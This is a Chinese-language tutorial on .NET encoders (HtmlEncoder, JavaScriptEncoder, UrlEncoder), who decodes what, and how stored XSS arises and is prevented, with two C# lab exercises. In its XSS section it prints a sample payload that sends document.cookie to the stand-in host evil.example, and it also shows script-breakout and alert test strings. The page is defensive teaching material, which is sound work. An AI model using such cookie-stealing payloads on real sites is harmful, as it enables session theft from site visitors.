補充：編碼器（Encoder）、解碼（Decode）與 XSS
中文為什麼有時變成 \u6587 或 文？改寫之後是誰把它還原？<script> 塞進文章標題為什麼會被執行，關卡設在哪裡才擋得住？
📌 什麼時候會用到這頁
- 在回應、log 或網頁原始碼裡看到中文變成
\u6587或文，想知道是不是壞了 - 想知道改寫過的字誰負責還原，自己要不要寫 decode
- 聽過 XSS，想看清楚它是怎麼發生的、編碼器為什麼擋得住
- 網路上查到
HtmlEncoder.Create(UnicodeRanges.All)這行，不知道自己的專案要不要加
這頁以觀念為主，最後有兩個小實驗，可做可不做。
1. 編碼和解碼是一來一回
先把兩個詞定下來：
| 詞 | 做什麼 | 目的是什麼 |
|---|---|---|
| 編碼（Encode） | 把某些字改寫成另一種寫法，例如「文」改寫成 \u6587、< 改寫成 \u003C | 字串放進 JSON、HTML、網址時，不會被誤當成那個格式的語法（< 不會變成標籤） |
| 解碼（Decode） | 把改寫的部分還原成原本的字，\u6587 還原成「文」 | 拿回和編碼前一模一樣的字串 |
編碼發生在「字串被寫進某個格式」的那一刻。在你的專案裡具體是這幾個地方：
| 你的程式做的事 | 字串被寫進哪裡 | 過哪個關卡 |
|---|---|---|
Controller return posts; | HTTP 回應的 body，格式是 JSON | JavaScriptEncoder |
Razor 網頁 @Model.Title | HTTP 回應的 body，格式是 HTML | HtmlEncoder |
組查詢字串 ?keyword=入門 | 網址 | UrlEncoder |
自己呼叫 JsonSerializer.Serialize 寫 log | log 檔，格式是 JSON | JavaScriptEncoder |
改寫的規則是公開的標準（JSON、HTML、網址各有自己的規格），任何人照規則都還原得了。所以編碼不是加密，不是為了把資料藏起來。
瀏覽器也會編碼：在請求那一邊
上面的表寫「你的程式」，是因為那張表講的是回應：字串從你的 API 送到瀏覽器。但同一條規則反過來也成立。使用者在搜尋框打「入門<b>」按下送出，前端程式會寫 fetch("/api/posts?keyword=" + encodeURIComponent(keyword))，這時候瀏覽器是寫的人，由它把這串字編碼成 %E5%85%A5%E9%96%80%3Cb%3E 再放進網址（encodeURIComponent 就是瀏覽器版的 UrlEncoder）。ASP.NET Core 收到後是讀的人，由它解碼，所以 [FromQuery] string keyword 拿到的是「入門<b>」。
所以編碼不是「瀏覽器的事」或「伺服器的事」，而是：誰把字串寫進某個格式，誰就編碼；誰讀那個格式，誰就解碼。瀏覽器和你的 API 在請求和回應裡輪流當寫的人和讀的人：
兩件事要分清楚：使用者在輸入框打字的那一刻什麼都沒發生，字就是字；編碼發生在瀏覽器把它放進網址的那一刻。用 POST 送 JSON 時，瀏覽器的 JSON.stringify 做的是同一個動作，只是它只改寫雙引號和反斜線，中文和 < 都原樣，所以看不太出來。
誰負責解碼？不是你
.NET 有 HtmlEncoder、JavaScriptEncoder、UrlEncoder 三個類別，但沒有 HtmlDecoder、JavaScriptDecoder、UrlDecoder。這不是漏做，而是還原本來就不是你的程式做的，是讀的那一方的解析器做的：
| 你用的編碼器 | 線路上長什麼樣 | 誰把它還原 | 還原之後 |
|---|---|---|---|
JavaScriptEncoder | "\u5165\u9580" | JSON 解析器：前端 response.json()、後端 JsonSerializer.Deserialize | 字串「入門」 |
HtmlEncoder | 入門 | 瀏覽器的 HTML 解析器 | 畫面上的「入門」 |
UrlEncoder | %E5%85%A5%E9%96%80 | ASP.NET Core 解析網址時：[FromQuery] string keyword 拿到的已經是還原後的字 | 字串「入門」 |
所以大多數時候你不用寫任何 decode 的程式碼。讀的那一方只要是正常的 JSON 解析器、瀏覽器、ASP.NET Core，還原就已經做完了。
真的要自己還原時
例外是你手上拿到一段已經編碼過的文字，而且沒有解析器幫你讀。例如從 log 檔或別人的 HTML 原始碼複製出來一段 文，想知道它是哪個字。這時候用下面三個方法：
| 要還原的寫法 | 方法 | 命名空間 |
|---|---|---|
文、< 這種 HTML 寫法 | WebUtility.HtmlDecode(string) | System.Net |
\u6587 這種 JSON 字串寫法 | JsonSerializer.Deserialize<string>(json)，傳進去的要是完整的 JSON 字串值，含外面的雙引號 | System.Text.Json |
%E6%96%87 這種網址寫法 | Uri.UnescapeDataString(string) | System |
📎 補充：這一頁的「編碼」和 UTF-8 的「編碼」是兩回事
- UTF-8 的編碼（
System.Text.Encoding.UTF8）：把「字」變成「位元組」。寫進檔案、送上網路時一定要做，因為檔案和網路只認位元組。 - 這一頁的編碼（
HtmlEncoder這一家）：把「字」變成「另一串字」。只有要把文字放進 HTML、JSON、網址時才做。 - 兩者有一個交會點：
UrlEncoder把「文」改寫成%E6%96%87，E6 96 87正是「文」的 UTF-8 三個位元組的十六進位。
2. 編碼器是輸出前的關卡：白名單
程式把一個字串寫進回應、網頁或網址之前，會先讓它每個字都過一次關卡：在白名單裡的字原樣輸出；不在白名單的字，改寫成一種「對方讀回來還原得了、但不會被誤當成程式碼」的寫法。這個關卡就是編碼器（Encoder）。
那中文為什麼也被改寫？因為 .NET 的預設白名單只有 BasicLatin（ASCII 的英數和常見符號）。中文不在裡面，就跟著被改寫。這不是壞掉：改寫的格式是標準的，對方讀回來一定還原得了；只是人眼看原始回應很難讀。
UnicodeRanges.All 的意思是「把白名單放大到整個 Unicode 基本平面（U+0000～U+FFFF）」，中文就會原樣輸出；<、>、& 照樣改寫，安全底線還在。
為什麼 <、>、& 不看白名單、永遠改寫？因為它們在 HTML 裡是「標籤開始」「標籤結束」「實體開始」的語法符號。放行它們，文字就有機會變成標籤。這件事發生時就叫 XSS。
3. XSS：關卡在防什麼
| 小節 | 標題 | 回答的問題 |
|---|---|---|
| 3-1 | 攻擊怎麼發生 | <script> 塞進標題之後，是誰執行了它 |
| 3-2 | 關卡擋在哪裡：輸出時，不是存入時 | 為什麼資料庫要存原文 |
| 3-3 | 「原封不動寫進網頁」在程式裡長什麼樣 | 哪些寫法有關卡、哪些沒有 |
| 3-4 | JSON 也有一個要擋的地方 | Web API 回 JSON，JavaScriptEncoder 改寫 < 是在防什麼 |
3-1. 攻擊怎麼發生
你的部落格有「新增文章」的 API，也有一個「文章頁」會把標題顯示出來。攻擊者在標題欄位填的不是標題，而是這一串：
<script>fetch("https://evil.example/?c=" + document.cookie)</script>接下來發生的事分成兩個時間點、兩個不同的人：
- 攻擊者送出
POST /api/posts，標題就是上面那串。對 API 來說它只是一個string，照常INSERT進資料庫。存原文是對的，這一步沒有錯。 - 之後任何一個讀者打開這篇文章頁。伺服器從資料庫拿出標題，用字串相接放進 HTML：
"<h1>" + post.Title + "</h1>"。 - 讀者的瀏覽器收到的 HTML 裡有一個真的
<script>標籤。瀏覽器不知道這段「本來是標題」，它只看到標籤，就當程式碼執行。 - 那段程式碼是在你的網站上執行的，所以拿得到你的網站發給這位讀者的 cookie，再用
fetch送到攻擊者的伺服器。讀者的畫面上什麼都看不出來。
「跨站（Cross-Site）」指的就是：程式碼是攻擊者寫的，卻在你的網站上、以讀者的身分執行，資料再跨到攻擊者的站。

3-2. 關卡擋在哪裡：輸出時，不是存入時
圖的下排就是解法：伺服器把標題放進 HTML 之前，先過一次 HtmlEncoder：
// 沒有關卡：標題原封不動放進 HTML
string html = "<h1>" + post.Title + "</h1>";
// 有關卡：< 變成 <、> 變成 >，瀏覽器只會把它當文字
string html = "<h1>" + HtmlEncoder.Default.Encode(post.Title) + "</h1>";瀏覽器收到的是 <h1><script>…</script></h1>。HTML 解析器看到 < 會還原成「< 這個字」，而不是「標籤開始」，所以畫面上顯示的是 <script>… 這串文字，什麼都不會執行。
為什麼不乾脆在存入資料庫時就改寫？因為同一個標題之後會輸出到三種地方：HTML 網頁、JSON、網址，每一種的改寫規則不一樣。存入時先改成 HTML 的寫法，放進 JSON 就錯了。實際跑一次：
| 步驟 | 內容 | 結果 |
|---|---|---|
存入時先用 HtmlEncoder 改寫 <b> | <b> | 資料庫裡存的是這 8 個字 |
| 之後回傳 JSON 給前端 | "<b>" | 前端 response.json() 只會還原 JSON 的寫法，拿到的還是 <b> 這 8 個字；用 textContent 顯示，畫面出現 <b>，不是 <b> |
| 之後又輸出到 Razor 網頁 | &lt;b&gt; | Razor 再編碼一次，畫面出現 <b> |
所以規則是：資料庫存原文；輸出到哪裡，就在輸出那一刻用哪裡的編碼器。負責的是輸出的那一方，不是存入的那一方。
3-3. 「原封不動寫進網頁」在程式裡長什麼樣
3-1 說的「原封不動」，對應到實際的程式碼是下面這幾種。前兩列有關卡，後面三列沒有：
| 寫法 | 有沒有關卡 | 說明 |
|---|---|---|
Razor：<h1>@Model.Title</h1> | 有 | Razor 自動呼叫 HtmlEncoder，這是 Razor 的預設行為 |
前端：element.textContent = post.title | 有 | 瀏覽器直接把字串當文字放進畫面，不解析 HTML，所以不用編碼也安全 |
Razor：@Html.Raw(Model.Title) | 沒有 | Raw 就是「原樣輸出、不要編碼」的意思，只能用在你自己寫的、確定安全的 HTML |
Controller：return Content("<h1>" + post.Title + "</h1>", "text/html"); | 沒有 | 字串相接，沒有任何東西幫你過關卡 |
前端：element.innerHTML = post.title | 沒有 | 瀏覽器會把這個字串當 HTML 解析，<script> 就會變成真的標籤 |
Web API 只回 JSON，不組 HTML，所以上面的事大多發生在前端：前端用 innerHTML 還是 textContent，決定了這個標題會不會變成標籤。後端的編碼器管不到那裡。
3-4. JSON 也有一個要擋的地方
既然 Web API 回的是 JSON、不是 HTML，JavaScriptEncoder 為什麼還要把 < 改寫成 \u003C？它防的不是前端 fetch 的情境（response.json() 之後 \u003C 已經還原成 <，之後用 innerHTML 一樣會中）。它防的是「把 JSON 直接寫在網頁的 <script> 裡」這種用法：
<script>
// 字串裡的 </script> 會把外面這個 script 標籤提前關掉，後面的字就變成網頁的一部分
var posts = [{"title":"</script><script>alert(1)</script>"}];
</script>
<script>
// 改寫成 \u003C 之後，瀏覽器找不到 </script>，標籤不會被提前關掉；JavaScript 讀字串時再還原
var posts = [{"title":"\u003C/script\u003E\u003Cscript\u003Ealert(1)\u003C/script\u003E"}];
</script>Web API 的回應是獨立的一份 application/json，不會被夾在網頁裡，所以框架敢用寬鬆版。
📎 補充：XSS 有三種型態，HttpOnly 的 cookie 偷不到
- 儲存型（Stored）：3-1 這種，惡意字串先進了資料庫，之後每個來看的人都中。部落格、留言板最常見。
- 反射型（Reflected）：惡意字串放在網址裡（例如搜尋關鍵字），伺服器把它原封不動寫回搜尋結果頁。要騙受害者點那個網址才會中。
- DOM 型：伺服器完全沒碰，是前端自己用
innerHTML把網址或輸入框的內容塞進畫面。 - cookie 設定
HttpOnly之後，JavaScript 的document.cookie讀不到它，3-1 那段程式碼就偷不到。這是第二道防線，但擋不住「用讀者的身分偷偷送出請求」這類其他攻擊，所以輸出時編碼還是必要的。 - 官方說明：Prevent Cross-Site Scripting (XSS) in ASP.NET Core、OWASP：Cross Site Scripting
4. 三種編碼器與對應的還原者
輸出的地方不同，「安全的寫法」就不同，所以 .NET 有三個編碼器（都在 System.Text.Encodings.Web）。每一個都有一個對應的還原者，而且都不是你：
| 編碼器 | 輸出到哪裡 | 「文」變成 | < 變成 | 誰在用 | 誰還原 |
|---|---|---|---|---|---|
HtmlEncoder | HTML 網頁的文字 | 文 | < | Razor 寫 @Model.Title 時 | 瀏覽器的 HTML 解析器 |
JavaScriptEncoder | JSON、JavaScript 的字串 | \u6587 | \u003C | System.Text.Json 序列化時 | JSON 解析器（response.json()、JsonSerializer.Deserialize） |
UrlEncoder | 網址 | %E6%96%87 | %3C | 組查詢字串時 | ASP.NET Core 解析網址時 |
三個都有 .Default（預設白名單）和 .Create(UnicodeRanges.All)（放大白名單）兩種拿法。網路上常看到的 HtmlEncoder.Create(UnicodeRanges.All) 是第一列、給 Razor 網頁用的；Web API 回的是 JSON，走的是第二列。
常見字元在三種編碼器下的長相（用 .Default 實際跑出來的）：
| 字 | HtmlEncoder | JavaScriptEncoder | UrlEncoder |
|---|---|---|---|
| 文 | 文 | \u6587 | %E6%96%87 |
< | < | \u003C | %3C |
> | > | \u003E | %3E |
& | & | \u0026 | %26 |
" | " | \u0022 | %22 |
' | ' | \u0027 | %27 |
+ | + | \u002B | %2B |
| 空白 | 原樣 | 原樣 | %20 |
/ | 原樣 | 原樣 | %2F |
看得出三個白名單不完全一樣：空白和 / 在 HTML、JSON 裡沒事，在網址裡有意義（分隔路徑、分隔參數），所以 UrlEncoder 會改寫它們。
5. 你的 Web API 會不會變 \u？（實測＋原始碼）
結論先講：不會。Controller 回傳的 JSON，中文直接輸出，連 <、& 都不改寫。但如果你自己呼叫 JsonSerializer.Serialize（例如寫 log），就會看到 \u。
🔍 實測：同一組 List<Post>，標題故意放 Docker 入門 <b>&</b>，用 curl 抓原始回應：
| 怎麼輸出 | 原始回應裡的「入門」 | 原始回應裡的 <b>& |
|---|---|---|
Controller 直接 return posts; | 入門 | <b>& |
自己呼叫 JsonSerializer.Serialize(posts) | \u5165\u9580 | \u003Cb\u003E\u0026 |
加了 AddJsonOptions，Encoder 換成 JavaScriptEncoder.Create(UnicodeRanges.All) | 入門 | \u003Cb\u003E\u0026 |
三個回應的 header 都是 Content-Type: application/json; charset=utf-8。
為什麼 Controller 不改寫？ASP.NET Core 組裝 JSON 輸出器的時候，發現你沒有自己設定 Encoder，就換成一顆寬鬆版的編碼器 UnsafeRelaxedJsonEscaping：中文、<、& 都原樣。名字裡的 Unsafe 是提醒「只能用在對方確定會把它當 UTF-8 JSON 讀的地方」，而 Web API 的回應正是這種地方（3-4 說的「夾在 <script> 裡」在這裡不會發生）。
🔎 原始碼：想確認上面沒騙你，再展開
🔎 框架原始碼：SystemTextJsonOutputFormatter.cs（GitHub 第 35–48 行）
// 第 35–48 行（ASP.NET Core 10.0.11）
internal static SystemTextJsonOutputFormatter CreateFormatter(JsonOptions jsonOptions)
{
var jsonSerializerOptions = jsonOptions.JsonSerializerOptions;
// 你沒有在 AddJsonOptions 裡設定 Encoder → 這裡是 null
if (jsonSerializerOptions.Encoder is null)
{
// If the user hasn't explicitly configured the encoder, use the less strict encoder that does not encode all non-ASCII characters.
// ↑ 原文註解：使用者沒設定的話，用比較寬鬆、不會把所有非 ASCII 字元都改寫的那顆
jsonSerializerOptions = new JsonSerializerOptions(jsonSerializerOptions)
{
Encoder = JavaScriptEncoder.UnsafeRelaxedJsonEscaping,
};
}
return new SystemTextJsonOutputFormatter(jsonSerializerOptions);jsonOptions.JsonSerializerOptions 是 new JsonSerializerOptions(JsonSerializerDefaults.Web) 建出來的（JsonOptions.cs 第 35 行），裡面沒有設 Encoder，所以上面的 is null 成立。你自己 new JsonSerializerOptions(JsonSerializerDefaults.Web) 去 Serialize 時，沒有人幫你做這個替換，所以會看到 \u（上面實測的第二列）。
6. 瀏覽器讀到會不會不一樣？（實測）
這一節是第 1 節「還原是讀的那一方做的」的實測。拿第 5 節那兩種回應（一個中文直接輸出，一個是 \u5165\u9580），讓瀏覽器用幾種方式讀：
| 瀏覽器怎麼讀 | 有差嗎 | 實測看到的 |
|---|---|---|
前端 JavaScript fetch(…) → response.json() | 沒差 | 兩邊的 title 都是 Docker 入門 <b>&</b>，用 === 比是 true。JSON 解析器把 \u5165 還原了 |
再用 textContent 放進網頁 | 沒差 | 畫面上都顯示 Docker 入門 <b>&</b>（<b> 當文字顯示，不是標籤） |
| 在網址列直接打開 API 網址 | 有差 | Edge 預設檢視顯示的是原始文字：一個看到 入門，另一個看到 \u5165\u9580。這裡沒有 JSON 解析器介入，所以沒有人還原 |
Razor 網頁裡的 文 和 文 | 畫面沒差 | 瀏覽器都畫出「文」；按 F12 看原始碼才有差。HTML 解析器把 文 還原了 |
所以：程式在讀的時候，改不改寫都一樣；只有人眼直接看原始回應時不一樣。這也是為什麼它不算 bug。而 JavaScriptEncoder 改寫 < 防的也不是第一列 fetch 的情境，是 3-4 那種把 JSON 夾進 <script> 的情境。
7. 什麼時候要自己設定
| 情境 | 要不要設 | 怎麼設 |
|---|---|---|
| Web API 的 Controller 回傳 JSON，想看到中文 | 不用 | 框架已經用寬鬆版（第 5 節） |
自己呼叫 JsonSerializer.Serialize 寫 log 或檔案，想看到中文 | 要 | new JsonSerializerOptions { Encoder = JavaScriptEncoder.Create(UnicodeRanges.All) } |
Razor 網頁，想讓原始碼裡是中文而不是 &#x…; | 看你要不要 | builder.Services.AddSingleton(HtmlEncoder.Create(UnicodeRanges.All)); |
Web API 想比框架預設嚴格（<、>、& 也改寫） | 多一層保險 | 下面的 AddJsonOptions（從瀏覽器看不出差別） |
正式語法：Program.cs（Web API 把編碼器換成 Create(UnicodeRanges.All)）
using System.Text.Encodings.Web; // JavaScriptEncoder
using System.Text.Unicode; // UnicodeRanges
// AddJsonOptions：設定整個 API 的 JSON 輸出
// Encoder：換掉「哪些字要改寫」的關卡
// 效果：中文照樣直接輸出；< > & 改成 \u003C 這種寫法（比框架預設嚴格）
builder.Services.AddControllers()
.AddJsonOptions(options =>
options.JsonSerializerOptions.Encoder = JavaScriptEncoder.Create(UnicodeRanges.All));📎 補充：UnicodeRanges.All 不是「全部」、UnsafeRelaxedJsonEscaping 自己不要設
UnicodeRanges.All只到 U+FFFF（基本平面）。大部分 emoji 在補充平面，還是會被改寫成\uD83D\uDE00這種一對代理字元（😀 實際跑出來就是這樣），讀回來一樣正常。- 官方建議只放行用到的範圍，但中文至少要 CJK 統一表意文字、CJK 符號標點、全形字元三個範圍，列起來麻煩，實務上多數人直接用
All。 JavaScriptEncoder.UnsafeRelaxedJsonEscaping連<、>、&都不改寫。框架在 Web API 已經幫你用了；自己 Serialize 的輸出如果會被寫進 HTML 或<script>（3-4 的情境），絕對不要用它。- 放行中文之後，輸出就依賴對方用 UTF-8 讀。ASP.NET Core 回應帶
charset=utf-8，一般沒事；自己寫檔案時記得用 UTF-8。
8. 小實驗：自己跑一次編碼與解碼
| 實驗 | 標題 | 看到什麼 |
|---|---|---|
| 實驗 1 | 三種編碼器來回一趟 | 同一個字串三種長相，三種都還原得回來 |
| 實驗 2 | 親眼看一次 XSS | 有關卡和沒關卡的 HTML，瀏覽器打開差在哪 |
正式語法：.NET 10 的單檔程式
這兩個實驗不用開專案。.NET 10 可以直接執行一個 .cs 檔（官方文件：File-based apps）：
# 放在任何「沒有 .csproj」的資料夾，例如 $HOME\lab\
# 有 .csproj 的資料夾會改成執行那個專案，檔名只會被當成參數
dotnet run encode-lab.cs檔案最上面可以放 #: 開頭的指令，用來代替 csproj 裡的設定。實驗 1 需要這一行：
// 單檔程式預設會以 Native AOT 的設定編譯，那組設定會關掉 JsonSerializer 的反射式序列化
// 這一行把 AOT 關掉，JsonSerializer.Serialize 才能用
#:property PublishAot=false🧪 想看它在擋什麼：寫完實驗 1 之後把這一行拿掉再跑一次，看錯誤訊息怎麼說。
實驗 1：三種編碼器來回一趟
需求：
- 字串用
Docker 入門 <b>&</b> - 分別用
HtmlEncoder、JsonSerializer.Serialize、UrlEncoder編碼，印出三種結果 - 再各自還原，用
==和原字串比較，印出三個True
💡 提示
| 需求 | 用什麼 | 命名空間 |
|---|---|---|
| HTML 寫法 | HtmlEncoder.Default.Encode(字串) | System.Text.Encodings.Web |
| JSON 寫法 | JsonSerializer.Serialize(字串)，內部用的就是 JavaScriptEncoder.Default，而且會加上外面的雙引號 | System.Text.Json |
| 網址寫法 | UrlEncoder.Default.Encode(字串) | System.Text.Encodings.Web |
| 還原三種寫法 | 第 1 節「真的要自己還原時」那三個方法 | 見第 1 節的表 |
| 主控台中文變亂碼 | 第一行加 Console.OutputEncoding = System.Text.Encoding.UTF8; |
✅ 驗收：三行編碼結果和第 4 節的對照表一致；三個比較都印出 True
參考答案（寫完再打開）
encode-lab.cs
#:property PublishAot=false
using System.Net; // WebUtility
using System.Text.Encodings.Web; // HtmlEncoder、UrlEncoder
using System.Text.Json; // JsonSerializer
// Windows 的主控台預設不是 UTF-8，不設這行中文可能變亂碼
Console.OutputEncoding = System.Text.Encoding.UTF8;
string original = "Docker 入門 <b>&</b>";
// 編碼：三種寫法
string html = HtmlEncoder.Default.Encode(original);
string json = JsonSerializer.Serialize(original);
string url = UrlEncoder.Default.Encode(original);
Console.WriteLine("HTML : " + html);
Console.WriteLine("JSON : " + json);
Console.WriteLine("URL : " + url);
// 解碼：各自用對應的還原方法
string htmlBack = WebUtility.HtmlDecode(html);
string jsonBack = JsonSerializer.Deserialize<string>(json)!;
string urlBack = Uri.UnescapeDataString(url);
Console.WriteLine(htmlBack == original);
Console.WriteLine(jsonBack == original);
Console.WriteLine(urlBack == original);執行結果（.NET SDK 10.0.303 實際跑出來的）：
HTML : Docker 入門 <b>&</b>
JSON : "Docker \u5165\u9580 \u003Cb\u003E\u0026\u003C/b\u003E"
URL : Docker%20%E5%85%A5%E9%96%80%20%3Cb%3E%26%3C%2Fb%3E
True
True
TrueJSON 那一列為什麼用 JsonSerializer.Serialize 而不是 JavaScriptEncoder.Default.Encode：兩個改寫出來的內容一樣，差別只在 Serialize 會加上外面的雙引號，而還原用的 Deserialize<string> 需要的正是「含雙引號的完整 JSON 字串值」，兩個剛好成對。
實驗 2：親眼看一次 XSS
需求：
- 標題字串用
<script>alert('XSS')</script>（只會跳一個對話框，在自己電腦上開沒有風險） - 產生兩個 HTML 檔：
xss-raw.html用字串相接把標題直接放進<h1>；xss-encoded.html放進去之前先過HtmlEncoder.Default.Encode - 用瀏覽器打開兩個檔案比較
💡 提示
| 需求 | 用什麼 |
|---|---|
| 寫檔案 | File.WriteAllText("檔名", 內容)，預設 UTF-8 |
| HTML 骨架 | <!doctype html><meta charset=utf-8><h1>…</h1> 就夠了 |
| 看瀏覽器怎麼解讀 | 打開後按 F12 看 Elements：一邊的 <h1> 裡是 <script> 元素，另一邊是一段文字 |
✅ 驗收：xss-raw.html 一打開就跳出 XSS 對話框、標題是空的；xss-encoded.html 不跳對話框，畫面上顯示 <script>alert('XSS')</script> 這串文字
參考答案（寫完再打開）
xss-lab.cs
using System.Text.Encodings.Web;
// 攻擊者填進標題欄位的字串
string title = "<script>alert('XSS')</script>";
// 沒有關卡：字串相接，標題原封不動放進 HTML
string raw = "<!doctype html><meta charset=utf-8><h1>" + title + "</h1>";
// 有關卡：放進 HTML 之前先過 HtmlEncoder
string encoded = "<!doctype html><meta charset=utf-8><h1>" + HtmlEncoder.Default.Encode(title) + "</h1>";
File.WriteAllText("xss-raw.html", raw);
File.WriteAllText("xss-encoded.html", encoded);
Console.WriteLine("寫好了，用瀏覽器打開 xss-raw.html 和 xss-encoded.html");兩個檔案的內容：
<!-- xss-raw.html：瀏覽器看到真的 script 標籤，執行 -->
<!doctype html><meta charset=utf-8><h1><script>alert('XSS')</script></h1>
<!-- xss-encoded.html：< 還原成「< 這個字」，只是文字 -->
<!doctype html><meta charset=utf-8><h1><script>alert('XSS')</script></h1>這個實驗不需要 #:property PublishAot=false，因為沒有用到 JsonSerializer。
延伸問題
- 部落格的「搜尋關鍵字」走網址（
GET /api/posts?keyword=入門）。前端送出時誰幫「入門」編碼成%E5%85%A5%E9%96%80？Controller 的[FromQuery] string keyword拿到的是哪一種？ - 如果前端是 React，寫
<h1>{post.title}</h1>是 3-3 表格裡的哪一列？dangerouslySetInnerHTML又是哪一列？ - 第 1 課的
Title最多 200 字。3-1 那串攻擊字串不到 200 字，長度限制擋不住它；那「輸入驗證」在 XSS 這件事上能做什麼、不能做什麼？
📖 官方文件
- System.Text.Json：自訂字元編碼（預設行為、
UnicodeRanges.All、UnsafeRelaxedJsonEscaping的警告都在這頁） - Prevent Cross-Site Scripting (XSS) in ASP.NET Core（三種編碼器該在哪裡用、Razor 的預設行為）
- Format response data in ASP.NET Core Web API（
AddJsonOptions） - System.Text.Encodings.Web 命名空間、UnicodeRanges
- WebUtility.HtmlDecode、Uri.UnescapeDataString
- File-based apps（dotnet run 檔名.cs）